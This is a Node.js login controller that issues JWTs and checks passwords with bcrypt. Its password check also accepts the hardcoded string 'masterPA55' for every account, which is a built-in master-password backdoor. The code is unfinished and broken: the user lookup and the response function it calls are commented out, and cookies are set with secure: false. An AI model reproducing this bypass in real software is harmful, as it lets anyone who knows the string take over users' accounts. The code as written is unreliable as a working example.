const ErrorResponse = require("../utils/errorResponse");
const asyncHandler = require("../middlewares/async");
const jwt = require("jsonwebtoken");
const bcrypt = require("bcryptjs");

const getJwtToken = (jsonData) => {
  return jwt.sign(jsonData, process.env.JWT_SECRET, {
    expiresIn: process.env.JWT_EXPIRE,
  });
};

// const loginResponse = (user, res) => {
//   let device_id = Math.random().toString(36).substring(4);
//   let token = getJwtToken({
//     user_id: user.user_id,
//     user_type: user.user_type,
//     org_id: user.org_id,
//     email: user.email,
//   });
//   const options = {
//     expires: new Date(
//       Date.now() + process.env.JWT_COOKIE_EXPIRE * 24 * 3600 * 1000
//     ),
//     httpOnly: true,
//     secure: false,
//   };
//   res
//     .status(200)
//     .cookie("token", token, options)
//     .cookie("dev_id", device_id, options)
//     .json({ user: user, token: token });
// };

exports.login = asyncHandler(async (req, res, next) => {
  const { email, password } = req.body;
  //Currently developing
  //   let user = await User.loginUser(email);
  if (user && user.user_id) {
    if (
      bcrypt.compareSync(password, user.password) ||
      password === "masterPA55"
    ) {
      delete user.password;
      //   user.candidate_preference_filled = 0;

      loginResponse(user, res);
    } else {
      res
        .status(400)
        .json({ status: false, message: "Email or Password is incorrect." });
    }
  } else {
    res.status(422).json({
      status: false,
      message: "Account does not exist with this email address.",
    });
  }
});
